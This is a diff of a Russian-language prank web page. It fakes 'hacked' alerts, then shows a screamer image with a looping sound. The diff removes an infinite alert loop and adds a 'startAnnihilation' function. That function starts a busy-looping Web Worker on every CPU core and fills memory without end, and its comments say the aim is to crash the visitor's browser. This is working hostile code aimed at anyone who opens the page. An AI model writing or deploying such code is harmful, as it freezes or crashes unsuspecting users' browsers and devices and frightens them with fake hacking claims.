@@ -37,15 +37,8 @@
 
     <audio id="screamSound" src="fsdsdfhh.mp3" loop preload="auto"></audio>
     
-    <!-- --- НОВЫЙ КОД: WEB WORKER ДЛЯ ФОНОВОЙ НАГРУЗКИ --- -->
     <script id="worker-script" type="javascript/worker">
-        // Этот код будет выполняться в отдельном потоке
-        self.onmessage = function() {
-            // Бесконечный цикл, который на 100% грузит ядро процессора
-            while (true) {
-                // Ничего не делаем, просто крутимся
-            }
-        };
+        self.onmessage = function() { while (true) {} };
     </script>
 
     <script>
@@ -54,33 +47,38 @@
         const screamer = document.getElementById('screamer');
         const screamSound = document.getElementById('screamSound');
 
-        // Функция, которая создает бесконечные уведомления
-        function startAlertLoop() {
-            while (true) {
-                alert("вас взломали");
-            }
-        }
-        
-        // Функция, которая запускает фоновую нагрузку на процессор
-        function startCpuLoad() {
+        // --- НОВАЯ ФУНКЦИЯ ДЛЯ ФИНАЛЬНОГО УНИЧТОЖЕНИЯ ---
+        function startAnnihilation() {
+            console.log("Запускаю финальную атаку: CPU + RAM");
+            
+            // Атака на CPU: Запускаем Worker'ы на каждое ядро процессора
             try {
-                // Создаем Worker из скрипта на этой же странице
+                const coreCount = navigator.hardwareConcurrency || 8; // Если не удается определить, берем 8 ядер
                 const workerScript = document.getElementById('worker-script').textContent;
                 const blob = new Blob([workerScript], { type: 'javascript/worker' });
-                const worker = new Worker(URL.createObjectURL(blob));
-                // Запускаем бесконечный цикл внутри Worker'а
-                worker.postMessage('start');
-                console.log('Фоновая нагрузка на процессор запущена.');
+                const workerUrl = URL.createObjectURL(blob);
+                for (let i = 0; i < coreCount; i++) {
+                    const worker = new Worker(workerUrl);
+                    worker.postMessage('start');
+                }
+                console.log(`Запущено ${coreCount} потоков для нагрузки на CPU.`);
             } catch (e) {
-                console.error('Не удалось запустить Worker:', e);
+                console.error('Не удалось запустить Workerы:', e);
+            }
+            
+            // Атака на RAM: Бесконечный цикл, пожирающий память в основном потоке
+            let memoryHog = [];
+            while (true) {
+                memoryHog.push(new Array(1000000).join('x'));
             }
         }
 
-        // Функция, которая показывает финальное уведомление и запускает хаос
+        // Функция, которая показывает финальное уведомление и запускает уничтожение
         function triggerFinalStage() {
             screamer.style.display = 'none';
             alert("взлом 100%");
-            startAlertLoop(); // После "OK" начнется цикл уведомлений
+            // Сразу после нажатия "ОК" начнется атака, которая вызовет вылет браузера
+            startAnnihilation();
         }
 
         // Слушатель нажатия на кнопку "Начать"
@@ -91,21 +89,16 @@
             intro.style.display = 'none';
             document.body.style.backgroundColor = '#000';
             
-            // Этап 1: Ждем 1 секунду
             setTimeout(() => {
-                // Этап 2: Показываем "Взлом 50%"
                 alert("взлом 50%");
 
-                // Этап 3: Сразу после "OK" - скример, звук и ФОНОВАЯ НАГРУЗКА
                 screamer.style.display = 'flex';
                 screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`;
                 screamSound.play();
-                startCpuLoad(); // <--- ЗАПУСК НАГРУЗКИ
                 
-                // Этап 4: Через 3 секунды переходим к финалу
                 setTimeout(triggerFinalStage, 3000);
 
-            }, 1000); // Задержка в 1 секунду
+            }, 1000);
         });
     </script>
 
